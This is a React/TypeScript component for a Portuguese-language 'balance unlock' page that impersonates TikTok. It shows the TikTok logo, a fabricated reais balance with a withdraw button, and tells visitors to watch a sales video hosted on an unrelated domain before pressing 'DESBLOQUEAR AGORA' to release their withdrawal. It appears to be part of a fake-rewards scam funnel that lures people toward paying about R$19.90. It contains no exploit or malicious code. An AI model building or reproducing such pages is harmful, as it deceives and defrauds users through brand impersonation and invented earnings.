import { Video } from './Video';

interface UnlockPageProps {
  balance: number;
  onUnlock: () => void;
}

export function UnlockPage({ balance, onUnlock }: UnlockPageProps) {
  return (
    <div className="min-h-screen bg-white flex flex-col">
      <div className="bg-[#FF3B5C] text-white p-4 text-center font-medium text-lg">
        ASSISTA O VÍDEO ABAIXO PARA LIBERAR SEU SAQUE E ACESSO VITALÍCIO.
      </div>

      <div className="p-6 flex flex-col items-center max-w-2xl mx-auto w-full">
        <div className="flex items-center gap-4 mb-8">
          {/* Nova logo do TikTok */}
          <img
            src="/tiktok.svg"
            alt="TikTok"
            className="h-8"
          />
          <div className="bg-gray-100 rounded-lg px-4 py-2">
            <span className="font-medium">R${balance.toFixed(2)}</span>
          </div>
          <button className="bg-[#FF3B5C] text-white px-4 py-2 rounded-lg font-medium">
            SACAR
          </button>
        </div>

        <div className="w-full h-1 bg-green-500 mb-8" />

        <h1 className="text-2xl font-bold text-center mb-4">
          DESBLOQUEIO DE SALDO
        </h1>

        <p className="text-gray-600 text-center mb-8">
          Veja como liberar seu saque assistindo ao vídeo.
        </p>

        <div className="w-full max-w-xl mx-auto mb-8">
          <Video videoUrl="https://opinaproo.xyz/tiktokavalia/respostaspremiada.com/wp-content/uploads/2025/01/VSL-TikTok-19.90.mp4" />
        </div>

        <button
          onClick={onUnlock}
          className="w-full max-w-md bg-[#FF3B5C] text-white py-4 rounded-lg font-medium text-lg flex items-center justify-center gap-2 hover:bg-[#ff2c4f] transition-colors"
        >
          🔓 DESBLOQUEAR AGORA
        </button>

        <p className="text-center text-green-500 mt-6">
          Concorra a um bônus adicional
        </p>

        <div className="mt-8 text-center text-sm text-gray-600">
          Ao participar das atividades de recompensa, você concorda com nossos{' '}
          <a href="#" className="underline">Termos</a> e <a href="#" className="underline">Condições</a>.
        </div>
      </div>
    </div>
  );
}
